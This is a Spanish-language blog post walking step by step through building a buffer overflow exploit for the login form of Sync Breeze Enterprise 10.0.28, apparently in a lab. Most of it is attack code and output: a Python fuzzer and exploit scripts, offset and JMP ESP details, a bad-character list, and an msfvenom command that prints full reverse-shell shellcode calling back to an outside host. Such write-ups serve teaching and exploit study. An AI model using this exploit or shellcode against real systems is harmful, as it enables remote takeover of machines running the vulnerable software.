---
author: eserror
layout: post
title: "Explotando Sync Breeze Enterprise 10.0.28"
pubDatetime: 2020-04-29
featured: false
description: Explotando Buffer Overflow en Sync Breeze Enterprise
---

## Introducción

SyncBreeze es una solución de sincronización de archivos rápida, potente y fiable para discos locales, redes compartidas, dispositivos de almacenamiento NAS y sistemas de almacenamiento empresarial. Los usuarios disponen de múltiples modos de sincronización de archivos de una y dos vías, sincronización periódica de archivos, sincronización de archivos en tiempo real, sincronización de archivos a nivel de bits, sincronización de archivos de múltiples flujos, sincronización de archivos en segundo plano y mucho más. - según su pagina oficial.

## Descripción de la vulnerabilidad

Sync Breeze Enterprise es vulnerable a un Buffer Overflow específicamente en la versión 10.0.28 que una vez explotado, permite a un atacante remoto tomar acceso completo del sistema otorgándole permisos de administrador.

La vulnerabilidad reside en el parámetro ` username` del campo de inicio de sesión de usuarios, parte de la interfaz web de la aplicación.

## Identificando la vulnerabilidad

Previamente había mencionado que Sync Breeze Enterprise cuenta con una interfaz web, podemos acceder a la misma que se encuentra corriendo en el puerto 80. Analizaremos el tipo de solicitud que se realiza al momento de autenticar a un usuario valido o invalido en la aplicación web.

​ <img src="/src/assets/images/sync_login_request.png">

Estos datos son suficientes para poder crear un simple fuzzer(software que realiza pruebas enviando datos aleatorios o inesperados por la aplicación con la finalidad de descubrir una falla) y comprobar la vulnerabilidad, de esta forma también podremos conocer en qué momento se desborda la pila al recibir la información enviada.

```python
#!/usr/bin/python

import socket, time, sys

size = 100

while (size < 2000):

    try:

        print ("\nEnviando payload con %s bytes" % size)

        inputBuffer = "A" * size
        content = "username=" + inputBuffer + "&password=A"

        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: 172.168.80.129\r\n"
        buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
        buffer += "Referer: http://172.168.80.129/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: "+str(len(content))+"\r\n"
        buffer += "\r\n"

        buffer += content

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("172.168.80.129", 80))
        s.send(buffer)

        s.close()
        size += 100
        time.sleep(10)
    except:
        print ("Could not connect!")

```

Una vez tenemos nuestro exploit listo para ejecutar, vamos y añadimos el proceso de Sync Breeze al depurador y corremos el exploit para ver qué información nos muestra.

<img src="/src/assets/images/pila_sobrescrita.png">

Ahora sabemos que la pila se desborda al enviar 800 bytes como se muestra en el resultado del script fuzzer.py, también podemos ver que el registro EIP ha sido sobrescrito por el valor "41414141", que corresponde a cuatro "A"s en hexadecimal y como ultimo, vemos la excepción que levanta el depurador al haberse desbordado la pila.

## Explotando la vulnerabilidad

Una vez que ya identificamos la vulnerabilidad y sabemos con cuantos bytes se desborda la pila, podemos pasar a la siguiente etapa hasta llegar a comprometer el sistema. Ahora enviaremos un patrón único que nos va ayudar a determinar el momento exacto antes de que se desborde la pila, para así poder inyectar nuestra shellcode.

Para generar este patrón único, haremos uso de una utilidad parte del framework Metasploit llamado pattern_create.rb. Lo ejecutamos de la siguiente forma:

```
nicolas@sotanovsky ~ $ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 800
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba
```

Volvemos al depurador, añadimos nuevamente el proceso de Sync Breeze y procedemos a ejecutar el exploit modificado añadiendo el patrón que creamos arriba. El script queda de la siguiente forma:

```python
#!/usr/bin/python


import socket


size = 100

try:
    print("\nSending evil buffer...")

    size = 100

    inputBuffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"

    content = "username=" + inputBuffer + "&password=A"


    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 172.168.80.129\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://172.168.80.129/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Accept-Encoding: gzip, deflate\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+ str(len(content)) + "\r\n"
    buffer += "\r\n"

    buffer += content

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("172.168.80.129", 80))
    s.send(buffer)

    s.close()

except:
    print("Could not connect!")

```

Una vez ejecutado el exploit podemos ver que el valor del registro EIP es diferente a las 4 As que teniamos como valor anteriormente. Ahora este registro contiene parte del patron unico que enviamos y que nos va a ayudar a continuar con el proceso de desarrollo de nuestro exploit final.

<img src="/src/assets/images/patron_enviado.png">

Ahora, vamos a localizar el espacio donde podemos inyectar la dirección donde estará localizada nuestra shellcode. Podemos realizar esta tarea en una forma sencilla con otro script parte del framework Metasploit llamadao pattern_offset.rb de la siguiente manera:

```
nicolas@sotanovsky ~ $ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 42306142
[*] Exact match at offset 780
```

Procedemos a modificar nuestro exploit nuevamente y añadimos nuevos cambios. La variable inputBuffer cambia y queda de la siguiente forma: `inputBuffer = "A" * 780 + "B" * 4 + "C" * 16`

Ahora que añadimos los cambios, veamos los resultados reflejados en el depurador.

<img src="/src/assets/images/cuatroB.png">

Esta vez el registro EIP contiene un valor distinto, esta valor son las 4 Bs que añadimos después de las 780 As y es allí, donde ira la dirección que apunta hacia nuestra shellcode. Ahora, antes que procedamos con lo siguientes pasos debemos sortear algunos obstáculos para que nuestro exploit funcione correctamente.

Antes de continuar debo mencionar que, uno de estos obstáculos es la protección [ASLR](https://es.wikipedia.org/wiki/Aleatoriedad_en_la_disposici%C3%B3n_del_espacio_de_direcciones), algunas aplicaciones implementan esta protección para hacer que las direcciones de memoria cambien a cada momento de ejecución, por lo tanto complicando un poco el proceso de explotación.

Para saltar esta protección debemos encontrar un modulo que se ejecute al mismo tiempo con el programa, no tenga protecciones ASLR o DEP y por ultimo, que la dirección de este modulo no contenga malos caracteres(badchars). Para esto vamos a utilizar una utilidad llamada mona.py que nos ayudará a llevar a cabo esta tarea.

<img src="/src/assets/images/mona_modules.png">

Una vez encontrado nuestra librería o modulo que en este caso es libspp.dll, procedemos a buscar una instrucción JMP ESP en el modulo mencionado anteriormente que nos permita apuntar hacia nuestra shellcode. El equivalente de la instrucción mencionada arriba en hexadecimal es FFE4 así que, la vamos a buscar de la siguiente forma, nuevamente haciendo de uso del script mona.py: !mona find -s "\xff\xe4"

<img src="/src/assets/images/salto_direccion.png">

Encontramos la dirección 0x10090C83 donde se encuentra la instrucción JMP ESP. Ahora modificamos nuestra variable y añadimos la dirección encontrada, hay que recordar que, la dirección debe ir al [revez](https://es.wikipedia.org/wiki/Endianness) de como esta escrita. Nuestra variable queda de la siguiente forma: `inputBuffer = "A" * 780 + "\x83\x0c\x09\x10" + "C" * 16 `

Estamos un paso más cerca de completar nuestro exploit y aun debemos sortear un ultimo obstáculo en lograr la ejecución de código remoto en la aplicación victima. En este ultimo paso debemos encontrar malos caracteres que puedan impedir la ejecución de nuestra shellcode. Aquí tenemos una lista de cara malos caracteres.

```
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

Cómo encontramos badchars que afecten a la aplicación? si observamos, los caracteres de arriba siguen una secuencia. Cuando hay un badchar, nos daremos cuenta que la secuencia de caracteres se verá interrumpida por caracteres extraños como 00, en la siguiente gráfica muestro un ejemplo.

Modificamos nuestro exploit y añadimos los badchars y repetimos el proceso hasta no encontrar más badchars.

```python
#!/usr/bin/python


import socket


size = 100

try:
    print("\nSending evil buffer...")

    badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
            "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
            "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
            "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
            "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
            "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
            "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
            "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
            "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
            "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
            "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
            "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
            "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
            "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
            "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
            "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
    inputBuffer = "A" * 780 + "B" * 4 + bad chars #"C" * 16
    content = "username=" + inputBuffer + "&password=A"


    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 172.168.80.129\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://172.168.80.129/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Accept-Encoding: gzip, deflate\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+ str(len(content)) + "\r\n"
    buffer += "\r\n"

    buffer += content

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("172.168.80.129", 80))
    s.send(buffer)

    s.close()

except:
    print("Could not connect!")

```

Por motivos de claridad he eliminado el badchars \x00, de esta forma podemos ver que la secuencia del 01 hasta el 09 se ve interrumpida por el carácter 00 y deja de tener sentido. Después del 09 viene el carácter \x0a, siendo este otro badchar que impedirá que nuestra shellcode funcione y se ejecute. Yo termine de buscar los badchars y encontré estos: ` \x00\x0a\x0d\x25\x26\x3d`

Una vez eliminado los badchars procedemos a generar nuestra shellcode y agregar menores detalles al script. Para generar nuestra shellcode debemos considerar el sistema operativo, la arquitectura y el formato de nuestra shellcode. Podemos generar nuestra shellcode haciendo uso de otra utilidad parte del framework Metasploit llamada msfvenom.

```
nicolas@sotanovsky ~ $ msfvenom -p windows/shell_reverse_tcp lhost=192.168.100.139 lport=5555 -f c -a x86 --platform windows -b "\x00\x0a\x0d\x25\x26\x3d\x2b" -e x86/shikata_ga_nai
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] =
"\xb8\xdb\xe8\xf4\xf1\xdb\xcf\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x52\x31\x46\x12\x03\x46\x12\x83\x1d\xec\x16\x04\x5d\x05\x54"
"\xe7\x9d\xd6\x39\x61\x78\xe7\x79\x15\x09\x58\x4a\x5d\x5f\x55"
"\x21\x33\x4b\xee\x47\x9c\x7c\x47\xed\xfa\xb3\x58\x5e\x3e\xd2"
"\xda\x9d\x13\x34\xe2\x6d\x66\x35\x23\x93\x8b\x67\xfc\xdf\x3e"
"\x97\x89\xaa\x82\x1c\xc1\x3b\x83\xc1\x92\x3a\xa2\x54\xa8\x64"
"\x64\x57\x7d\x1d\x2d\x4f\x62\x18\xe7\xe4\x50\xd6\xf6\x2c\xa9"
"\x17\x54\x11\x05\xea\xa4\x56\xa2\x15\xd3\xae\xd0\xa8\xe4\x75"
"\xaa\x76\x60\x6d\x0c\xfc\xd2\x49\xac\xd1\x85\x1a\xa2\x9e\xc2"
"\x44\xa7\x21\x06\xff\xd3\xaa\xa9\x2f\x52\xe8\x8d\xeb\x3e\xaa"
"\xac\xaa\x9a\x1d\xd0\xac\x44\xc1\x74\xa7\x69\x16\x05\xea\xe5"
"\xdb\x24\x14\xf6\x73\x3e\x67\xc4\xdc\x94\xef\x64\x94\x32\xe8"
"\x8b\x8f\x83\x66\x72\x30\xf4\xaf\xb1\x64\xa4\xc7\x10\x05\x2f"
"\x17\x9c\xd0\xe0\x47\x32\x8b\x40\x37\xf2\x7b\x29\x5d\xfd\xa4"
"\x49\x5e\xd7\xcc\xe0\xa5\xb0\x32\x5c\xc1\xcb\xdb\x9f\x09\xd9"
"\xa8\x29\xef\x8b\xde\x7f\xb8\x23\x46\xda\x32\xd5\x87\xf0\x3f"
"\xd5\x0c\xf7\xc0\x98\xe4\x72\xd2\x4d\x05\xc9\x88\xd8\x1a\xe7"
"\xa4\x87\x89\x6c\x34\xc1\xb1\x3a\x63\x86\x04\x33\xe1\x3a\x3e"
"\xed\x17\xc7\xa6\xd6\x93\x1c\x1b\xd8\x1a\xd0\x27\xfe\x0c\x2c"
"\xa7\xba\x78\xe0\xfe\x14\xd6\x46\xa9\xd6\x80\x10\x06\xb1\x44"
"\xe4\x64\x02\x12\xe9\xa0\xf4\xfa\x58\x1d\x41\x05\x54\xc9\x45"
"\x7e\x88\x69\xa9\x55\x08\x99\xe0\xf7\x39\x32\xad\x62\x78\x5f"
"\x4e\x59\xbf\x66\xcd\x6b\x40\x9d\xcd\x1e\x45\xd9\x49\xf3\x37"
"\x72\x3c\xf3\xe4\x73\x15";
```

Añadimos esta shellcode a nuestro exploit y unos cuantos NOPS(no instruccion). Una vez tenemos listo los últimos detalles, es hora del momento de la verdad, ejecutemos el exploit!

```
nicolas@sotanovsky ~ $ python exploit.py
```

<script id="asciicast-QLaOOd7XoqO2Xfvu4Zryp4J5R" src="https://asciinema.org/a/QLaOOd7XoqO2Xfvu4Zryp4J5R.js" async></script>
